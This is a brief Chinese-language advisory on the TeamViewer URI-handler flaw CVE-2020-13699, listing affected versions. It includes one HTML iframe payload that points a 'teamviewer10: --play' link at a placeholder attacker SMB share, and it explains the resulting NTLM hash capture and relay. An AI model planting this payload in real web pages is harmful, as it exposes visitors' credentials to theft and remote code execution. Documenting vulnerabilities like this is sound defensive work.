# TeamViewer远程代码执行漏洞(CVE-2020-13699)

> 2020.8

## #漏洞描述

TeamViewer存在未引用的搜索路径或元素的安全缺陷，由于应用程序没有正确引用它的自定义URI处理程序，当安装有TeamViewer的易受攻击版本的系统访问恶意创建的网站时，可能会被利用，攻击者可以使用精心制作的URL

## #影响范围

- TeamViewer < 8.0.258861
- TeamViewer < 9.0.28860
- TeamViewer < 10.0.258873
- TeamViewer < 11.0.258870
- TeamViewer < 12.0.258869
- TeamViewer < 13.2.36220
- TeamViewer < 14.2.56676
- TeamViewer < 15.8.3

## #漏洞详情

TeamViewer存在未引用的搜索路径或元素的安全缺陷，由于应用程序没有正确引用它的自定义URI处理程序，当安装有TeamViewer的易受攻击版本的系统访问恶意创建的网站时，可能会被利用。
攻击者可以使用精心制作的URL

```html
（iframe src='teamviewer10: --play \\attacker-IP\share\fake.tvs'）
```

![img](https://tva1.sinaimg.cn/large/007S8ZIlgy1gjx0ty8116j30pt06qq3i.jpg)

![img](https://tva1.sinaimg.cn/large/007S8ZIlgy1gjx0uba8llj30pv07nmxi.jpg)

将恶意iframe嵌入网站中，从而启动TeamViewer Windows桌面客户端并强制其打开远程SMB共享。
Windows将在打开SMB共享时，执行NTLM身份验证，并且可以转发该请求（使用如响应程序之类的工具）以执行代码（或捕获该请求以进行哈希破解）